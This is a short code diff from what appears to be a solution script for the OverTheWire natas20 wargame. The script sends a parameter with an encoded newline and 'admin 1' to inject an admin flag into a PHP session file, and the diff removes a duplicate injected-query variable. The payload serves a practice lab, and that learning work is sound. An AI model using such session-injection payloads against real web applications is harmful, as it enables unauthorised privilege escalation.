@@ -1,8 +1,6 @@
 url = 'http://natas20.natas.labs.overthewire.org/index.php?debug';
-params = 'name=%0Aadmin%201';
+params = 'name=%0Aadmin%201'; //Note both %0A and %0D works here
 truestring = "<br>You are an admin";
-
-injected_query = "%0Dadmin%201"; //Note both %0A and %0D works here
 
 //Writes to session file
 xhr = new XMLHttpRequest();
